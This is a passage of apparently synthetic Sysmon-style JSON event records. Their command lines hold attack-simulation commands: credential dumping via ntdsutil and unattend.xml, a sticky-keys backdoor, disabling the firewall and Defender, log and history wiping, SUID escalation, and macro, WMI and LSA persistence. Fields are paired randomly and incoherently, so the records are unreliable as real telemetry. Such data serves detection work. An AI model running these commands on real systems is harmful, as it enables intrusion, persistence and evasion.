    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-69.davis.com",
        "User": "millermargaret",
        "ProcessID": 2845,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"systemctl stop ufw\\n\",",
        "LogonID": 201208,
        "LogonGuid": "ce3a6718-3183-4122-823d-1d61550b0faa",
        "SourceProcessID": 9632,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\pattern..exe",
        "DestinationProcessID": 7238,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\consumer..exe",
        "UtcTime": "2024-05-17T01:36:51.748331Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-42.garcia.com",
        "User": "dmercado",
        "ProcessID": 1274,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"type C:\\\\Windows\\\\Panther\\\\unattend.xml\\ntype C:\\\\Windows\\\\Panther\\\\Unattend\\\\unattend.xml\\n\",",
        "LogonID": 591609,
        "LogonGuid": "33263fec-1860-4d1a-ad1d-81c014fd5f52",
        "SourceProcessID": 6734,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\late..exe",
        "DestinationProcessID": 3632,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\claim..dll",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-61.morales-richards.com",
        "User": "bjones",
        "ProcessID": 1993,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 890365,
        "LogonGuid": "1c56aac6-b014-4641-8719-bbe41514f95e",
        "SourceProcessID": 1074,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\author..exe",
        "DestinationProcessID": 6482,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\speech..dll",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-20.hogan.info",
        "User": "whitney22",
        "ProcessID": 9982,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale\\n\",",
        "LogonID": 274348,
        "LogonGuid": "3f6baf9b-a87e-43e4-a236-4cd18e2f1b4b",
        "SourceProcessID": 6300,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\century..dll",
        "DestinationProcessID": 5753,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\note..dll",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-93.weber.com",
        "User": "christopher19",
        "ProcessID": 2503,
        "ProcessName": "malware.exe",
        "CommandLine": "\"mkdir #{output_folder}\\nntdsutil \\\"ac i ntds\\\" \\\"ifm\\\" \\\"create full #{output_folder}\\\" q q\\n\",",
        "LogonID": 832784,
        "LogonGuid": "d6b1c56d-77ad-4c57-8cb2-aea6a772360a",
        "SourceProcessID": 5392,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\close..dll",
        "DestinationProcessID": 4538,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\his..exe",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-98.roman.info",
        "User": "melissa85",
        "ProcessID": 6028,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"$secure_pwd = \\\"#{password}\\\" | ConvertTo-SecureString -AsPlainText -Force\\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $secure_pwd\\nConnect-AzureAD -Credential $creds\\nRemove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}\\n\",",
        "LogonID": 169141,
        "LogonGuid": "6e30c503-1090-4dca-b7e0-baf15f3ca781",
        "SourceProcessID": 2501,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\performance..dll",
        "DestinationProcessID": 8833,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\it..exe",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-80.henson.com",
        "User": "thomasgina",
        "ProcessID": 1441,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"IF NOT EXIST C:\\\\Windows\\\\System32\\\\sethc_backup.exe (copy C:\\\\Windows\\\\System32\\\\sethc.exe C:\\\\Windows\\\\System32\\\\sethc_backup.exe) ELSE ( pushd )\\ntakeown /F C:\\\\Windows\\\\System32\\\\sethc.exe /A\\nicacls C:\\\\Windows\\\\System32\\\\sethc.exe /grant Administrators:F /t\\ncopy /Y C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\Windows\\\\System32\\\\sethc.exe\\n\",",
        "LogonID": 997593,
        "LogonGuid": "3c4b5855-69ff-480e-b70f-fc1a3dd2194e",
        "SourceProcessID": 5563,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\skill..dll",
        "DestinationProcessID": 5616,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\difficult..dll",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-76.garcia.com",
        "User": "rogerscarla",
        "ProcessID": 7124,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"bcdedit /set testsigning on\",",
        "LogonID": 673616,
        "LogonGuid": "69f360ea-fd6c-4894-bef5-e2b474c6222f",
        "SourceProcessID": 9348,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\production..exe",
        "DestinationProcessID": 3959,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\test..exe",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-10.jones.net",
        "User": "bwong",
        "ProcessID": 8335,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"net use c: #{share_name}\\nnet share test=#{share_name} /REMARK:\\\"test share\\\" /CACHE:No\\n\",",
        "LogonID": 476392,
        "LogonGuid": "89ba7e6e-1fc4-4848-a0b5-25ce1240389d",
        "SourceProcessID": 3426,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\feeling..exe",
        "DestinationProcessID": 5491,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\seek..exe",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-67.hernandez.org",
        "User": "brandymullins",
        "ProcessID": 3719,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"# Registry setting to \\\"Trust access to the VBA project object model\\\" in Word\\n$registryKey = \\\"HKCU:Software\\\\Microsoft\\\\Office\\\\16.0\\\\Word\\\\Security\\\"\\n$registryValue = \\\"AccessVBOM\\\"\\n$registryData = \\\"1\\\"\\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\\n$flagPath1 = \\\"$env:USERPROFILE\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates\\\\T1137-001_Flag1.txt\\\"\\n$flagPath2 = \\\"$env:USERPROFILE\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates\\\\T1137-001_Flag2.txt\\\"\\n# Get the value of the Key/Value pair\\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\\n# Logical operation to: if the value of the key/value is 1, do nothing - \\n# if the value is 0, change it to 1 and create flag1 - \\n# if it doesn't exist, create the value and flag2\\nif ($value -eq \\\"1\\\") \\n{\\n  Write-Host \\\"The registry value '$registryValue' already exists with the required setting.\\\"\\n}   \\n  elseif ($value -eq \\\"0\\\") \\n{\\n  Write-Host \\\"The registry value was set to 0, temporarily changing to 1.\\\"\\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\\n  echo \\\"flag1\\\" > $flagPath1\\n} \\n  else \\n{\\n  Write-Host \\\"The registry value '$registryValue' does not exist, temporarily creating it.\\\"\\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\\n  echo \\\"flag2\\\" > $flagPath2\\n}\\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\\n# Define the path of copied normal template for restoral\\n$copyPath = \\\"$env:USERPROFILE\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates\\\\Normal1.dotm\\\"\\n# Define the path to the normal template\\n$docPath = \\\"$env:USERPROFILE\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates\\\\Normal.dotm\\\"\\n# Create copy of orginal template for restoral\\nCopy-Item -Path $docPath -Destination $copyPath -Force\\n# VBA code to be insterted as a Macro\\n# Will create a scheduled task to open the Calculator at 8:04pm daily\\n$vbaCode = @\\\"\\n  Sub AutoExec()\\n  Dim applicationPath As String\\n  Dim taskName As String\\n  Dim runTime As String\\n  Dim schTasksCmd As String\\n  applicationPath = \\\"C:\\\\Windows\\\\System32\\\\calc.exe\\\"\\n  taskName = \\\"OpenCalcTask\\\"\\n  runTime = \\\"20:04\\\"\\n  schTasksCmd = \\\"schtasks /create /tn \\\"\\\"\\\" & taskName & \\\"\\\"\\\" /tr \\\"\\\"\\\" & applicationPath & \\\"\\\"\\\" /sc daily /st \\\" & runTime & \\\" /f\\\"\\n  Shell \\\"cmd.exe /c \\\" & schTasksCmd, vbNormalFocus\\n  End Sub\\n\\\"@\\n# Create a new instance of Word.Application\\n$word = New-Object -ComObject Word.Application\\n# Keep the Word application hidden\\n$word.Visible = $false\\n# Open the document\\n$document = $word.Documents.Open($docPath)\\n# Access the VBA project of the document\\n$vbaProject = $document.VBProject\\n# Add a new module to the VBA project\\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\\n# Add the VBA code to the new module\\n$newModule.CodeModule.AddFromString($vbaCode)\\n# Run the Macro\\n$word.run(\\\"AutoExec\\\")\\n# Save and close the document\\n$document.SaveAs($docPath)\\n$document.Close()\\n# Quit Word\\n$word.Quit()\\n# Release COM objects\\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null\\n\",",
        "LogonID": 517203,
        "LogonGuid": "fd6fa77d-d455-4b26-bb3c-275c6569507c",
        "SourceProcessID": 6602,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\per..dll",
        "DestinationProcessID": 6525,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\everything..exe",
        "UtcTime": "2024-05-17T01:36:51.749332Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-70.green-allen.info",
        "User": "hunter00",
        "ProcessID": 3645,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\\n                EventNameSpace='root\\\\CimV2';\\n                QueryLanguage=\\\"WQL\\\";\\n                Query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\\\"};\\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \\\"root\\\\subscription\\\" -Arguments $FilterArgs\\n\\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\\n                ScriptingEngine='VBScript';\\n                ScriptText='\\n                Set objws = CreateObject(\\\"Wscript.Shell\\\")\\n                objws.Run \\\"notepad.exe\\\", 0, True\\n                '}\\n$Consumer=Set-WmiInstance -Namespace \\\"root\\\\subscription\\\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\\n\\n$FilterToConsumerArgs = @{\\nFilter = $Filter;\\nConsumer = $Consumer;\\n}\\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs\\n\",",
        "LogonID": 961672,
        "LogonGuid": "aa70c7d9-69a8-482e-b1d9-c85406da6d13",
        "SourceProcessID": 3431,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\bar..dll",
        "DestinationProcessID": 3606,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\month..exe",
        "UtcTime": "2024-05-17T01:36:51.750823Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-62.perez.com",
        "User": "perezmichael",
        "ProcessID": 7965,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add HKLM64\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\\nreg add HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 667832,
        "LogonGuid": "930a9458-473b-4911-9a79-fc84eed1fd29",
        "SourceProcessID": 9636,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\find..dll",
        "DestinationProcessID": 7232,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\police..exe",
        "UtcTime": "2024-05-17T01:36:51.750823Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-64.davis-rodgers.info",
        "User": "patrickduncan",
        "ProcessID": 1571,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"cp #{payload} /tmp/hello.c\\nchown root /tmp/hello.c\\nmake /tmp/hello\\nchown root /tmp/hello\\nchmod u+s /tmp/hello\\n/tmp/hello\\n\",",
        "LogonID": 421712,
        "LogonGuid": "06aff83c-9e11-4d10-bb53-8addf736cdd2",
        "SourceProcessID": 6632,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\decide..exe",
        "DestinationProcessID": 2734,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\rather..exe",
        "UtcTime": "2024-05-17T01:36:51.750823Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-29.may-sullivan.org",
        "User": "laurarosario",
        "ProcessID": 8729,
        "ProcessName": "nc.exe",
        "CommandLine": "\"halt --reboot\\n\",",
        "LogonID": 479172,
        "LogonGuid": "f2d538dd-db28-4a43-a5e1-076f5fd9eeb6",
        "SourceProcessID": 8094,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\above..dll",
        "DestinationProcessID": 7749,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\enter..dll",
        "UtcTime": "2024-05-17T01:36:51.750823Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-38.garcia-anderson.com",
        "User": "vdouglas",
        "ProcessID": 7698,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"net share\\n\",",
        "LogonID": 634537,
        "LogonGuid": "bb4e739e-85a3-4635-93a1-8cb2aa2f0138",
        "SourceProcessID": 1952,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\bring..dll",
        "DestinationProcessID": 8562,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\employee..dll",
        "UtcTime": "2024-05-17T01:36:51.750823Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-48.gibbs-barnes.info",
        "User": "dustin23",
        "ProcessID": 3857,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sudo defaults write com.apple.loginwindow LoginHook #{script}\\n\",",
        "LogonID": 437203,
        "LogonGuid": "42d15fa6-0e8f-4cfa-afee-92507132aee1",
        "SourceProcessID": 8514,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\country..exe",
        "DestinationProcessID": 2323,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\education..dll",
        "UtcTime": "2024-05-17T01:36:51.751823Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-29.king-harvey.com",
        "User": "matthewhoward",
        "ProcessID": 9526,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"kubectl create -f src/cronjob.yaml -n #{namespace}\\n\",",
        "LogonID": 439887,
        "LogonGuid": "64dae7c9-f877-4bc5-8bfd-63aa507e33ef",
        "SourceProcessID": 5937,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\staff..exe",
        "DestinationProcessID": 5319,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\ask..dll",
        "UtcTime": "2024-05-17T01:36:51.751823Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-79.stanley.com",
        "User": "benjaminfreeman",
        "ProcessID": 4583,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"chmod +x #{autosuid}\\nbash #{autosuid}\\n\",",
        "LogonID": 169513,
        "LogonGuid": "297028cc-cda6-456e-862c-a1206a6b0fa1",
        "SourceProcessID": 6231,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\develop..exe",
        "DestinationProcessID": 8881,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\he..exe",
        "UtcTime": "2024-05-17T01:36:51.751823Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-16.wade-brewer.biz",
        "User": "grayanna",
        "ProcessID": 7169,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"cat /dev/null > #{history_path}\\n\",",
        "LogonID": 893944,
        "LogonGuid": "9aacbd07-7fb5-4cb8-995e-e2eb4c507f5e",
        "SourceProcessID": 3856,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\sit..dll",
        "DestinationProcessID": 5888,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\third..exe",
        "UtcTime": "2024-05-17T01:36:51.751823Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-51.wade.net",
        "User": "noliver",
        "ProcessID": 6020,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \\\"CN=Users,DC=#{domain},DC=#{top_level_domain}\\\" -s sub -a always -z 1000 dn\\n\",",
        "LogonID": 822262,
        "LogonGuid": "6da67c5d-14cf-4e10-b542-f45d74632e17",
        "SourceProcessID": 5265,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\possible..exe",
        "DestinationProcessID": 2000,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\street..exe",
        "UtcTime": "2024-05-17T01:36:51.751823Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-98.williams.net",
        "User": "joseph12",
        "ProcessID": 3497,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet\",",
        "LogonID": 417042,
        "LogonGuid": "208bd973-bc9c-4cee-ae8d-fd8287928227",
        "SourceProcessID": 5558,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\street..dll",
        "DestinationProcessID": 3174,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\check..exe",
        "UtcTime": "2024-05-17T01:36:51.752823Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-81.smith-lewis.info",
        "User": "christopher74",
        "ProcessID": 1279,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$file = New-Item $env:windir\\\\registration\\\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \\\"File created: $($file.FullName)\\\"\\n\",",
        "LogonID": 404050,
        "LogonGuid": "c082636e-4d57-457b-bf11-4eab0f7b3764",
        "SourceProcessID": 8374,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\instead..exe",
        "DestinationProcessID": 4375,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\idea..exe",
        "UtcTime": "2024-05-17T01:36:51.752823Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-30.oliver.net",
        "User": "sandragonzalez",
        "ProcessID": 7743,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"schtasks /create /tn \\\"T1053_005_OnLogon\\\" /sc onlogon /tr \\\"cmd.exe /c calc.exe\\\"\\nschtasks /create /tn \\\"T1053_005_OnStartup\\\" /sc onstart /ru system /tr \\\"cmd.exe /c calc.exe\\\"\\n\",",
        "LogonID": 326533,
        "LogonGuid": "7fa21761-c268-4803-997f-af1de79d1c1b",
        "SourceProcessID": 1343,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\north..exe",
        "DestinationProcessID": 4594,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\suffer..dll",
        "UtcTime": "2024-05-17T01:36:51.752823Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-17.kirby-oconnell.info",
        "User": "robinsonjohn",
        "ProcessID": 9457,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo unlink #{system_log_path}\\n\",",
        "LogonID": 411735,
        "LogonGuid": "ef6cd251-2903-4048-b360-d148d78addee",
        "SourceProcessID": 8550,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\job..dll",
        "DestinationProcessID": 4703,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\produce..exe",
        "UtcTime": "2024-05-17T01:36:51.752823Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-63.johnson-adkins.biz",
        "User": "melissa79",
        "ProcessID": 7099,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes\\n\",",
        "LogonID": 750591,
        "LogonGuid": "a3b2625d-aa0e-43ee-a143-143506c326e1",
        "SourceProcessID": 5389,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\official..dll",
        "DestinationProcessID": 6299,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\look..exe",
        "UtcTime": "2024-05-17T01:36:51.752823Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-99.duncan.net",
        "User": "ajohnson",
        "ProcessID": 5821,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=organizationalUnit) #{optional_args}\\n\",",
        "LogonID": 956721,
        "LogonGuid": "989f971b-d935-4c7f-9fa6-071b0a4bfea5",
        "SourceProcessID": 1851,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\too..exe",
        "DestinationProcessID": 4343,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\laugh..dll",
        "UtcTime": "2024-05-17T01:36:51.753823Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-56.zuniga-graham.info",
        "User": "jonathon62",
        "ProcessID": 6619,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.002\\\\bin\\\\package.dll\\\" C:\\\\Windows\\\\System32\\\\\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\" /v \\\"Authentication Packages\\\" /t REG_MULTI_SZ /d \\\"msv1_0\\\\0package.dll\\\" /f\\n\",",
        "LogonID": 231940,
        "LogonGuid": "5dadbcd3-425a-4bde-a902-01626167892b",
        "SourceProcessID": 2261,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\season..dll",
        "DestinationProcessID": 9384,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\surface..dll",
        "UtcTime": "2024-05-17T01:36:51.753823Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-92.ali.com",
        "User": "ssullivan",
        "ProcessID": 5449,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"time\\n\",",
        "LogonID": 166151,
        "LogonGuid": "28e794bc-186f-47ab-8b20-025c872aee3c",
        "SourceProcessID": 1301,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\simply..exe",
        "DestinationProcessID": 9130,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\right..exe",
        "UtcTime": "2024-05-17T01:36:51.753823Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-65.ferguson.com",
        "User": "stephen26",
        "ProcessID": 1403,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale\\n\",",
        "LogonID": 957988,
        "LogonGuid": "e439b54c-5a13-4651-a89f-38b915869797",
        "SourceProcessID": 6191,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\arrive..dll",
        "DestinationProcessID": 1498,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\report..exe",
        "UtcTime": "2024-05-17T01:36:51.753823Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-02.harrison-murphy.info",
        "User": "kenneth66",
        "ProcessID": 5869,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters\\\" /v AutoShareServer /t REG_DWORD /d 0 /f\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters\\\" /v AutoShareWks /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 988480,
        "LogonGuid": "d9fea539-0a52-43ea-977b-9a64ee2b5167",
        "SourceProcessID": 1790,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\past..dll",
        "DestinationProcessID": 7568,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\likely..dll",
        "UtcTime": "2024-05-17T01:36:51.753823Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-60.castaneda.info",
        "User": "manderson",
        "ProcessID": 3127,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Start-Process \\\"#{nsudo_path}\\\" -Argument \\\"-U:T -P:E cmd\\\"\\nStart-Sleep -Second 5\\nStop-Process -Name \\\"cmd\\\" -force -erroraction silentlycontinue\\n\",",
        "LogonID": 308813,
        "LogonGuid": "9d3a96bb-9b80-4b1b-b523-814cea3f9226",
        "SourceProcessID": 5953,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\evidence..dll",
        "DestinationProcessID": 8869,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\include..exe",
        "UtcTime": "2024-05-17T01:36:51.753823Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-58.johnson.com",
        "User": "amanda13",
        "ProcessID": 5959,
        "ProcessName": "nc.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\csc.exe -out:#{output_file_name} \\\"#{input_source_code}\\\"\\n#{output_file_name}\\n\",",
        "LogonID": 570996,
        "LogonGuid": "96ab1726-19ae-4ee0-b0f6-1bf31d0121f0",
        "SourceProcessID": 8308,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\above..dll",
        "DestinationProcessID": 9721,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\commercial..exe",
        "UtcTime": "2024-05-17T01:36:51.754822Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-61.taylor-oneill.com",
        "User": "nicholas87",
        "ProcessID": 4366,
        "ProcessName": "malware.exe",
